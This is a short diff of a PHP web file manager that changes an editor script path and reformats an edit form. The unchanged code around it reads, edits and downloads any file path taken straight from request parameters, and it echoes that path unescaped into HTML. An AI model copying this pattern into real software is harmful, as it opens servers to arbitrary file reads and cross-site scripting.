@@ -330,7 +330,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 			     fclose($fp);
 		        }
                         
-                        echo '<script language="javascript" type="text/javascript" src="/editarea/edit_area/edit_area_full.js"></script>';
+                        echo '<script language="javascript" type="text/javascript" src="/ai-web/editarea/edit_area_full.js"></script>';
                         echo '<script language="javascript" type="text/javascript">';
                         echo "editAreaLoader.init({id : 'textarea_1', toolbar: 'save,load,search,go_to_line,|,undo,redo,|, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help', syntax_selection_allow: 'css,html,js,php,python,vb,xml,c,cpp,sql,basic,pas,brainfuck',syntax:'php', start_highlight: true, save_callback:'mysave'});";
                         echo "function mysave(id, content){  alert(content);  }";
@@ -351,7 +351,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 			     fclose($fp);
 		        }
                         //echo("<script>location.href ='editor.php?title=".$_POST['path'].'/'.$_POST['name']."';</script>");
-			echo '<form method="POST"><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save" /> <textarea cols=1000 rows=60 name="src" style="background:#000000;color:#30FF00">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /></form>';
+			echo '<form method="POST"><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save"/><textarea cols=1000 rows=60 name="src" style="background:#000000;color:#30FF00">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br/></form>';
 
 		}elseif($_POST['opt'] == 'download') {
 			$path = $_POST['path'];
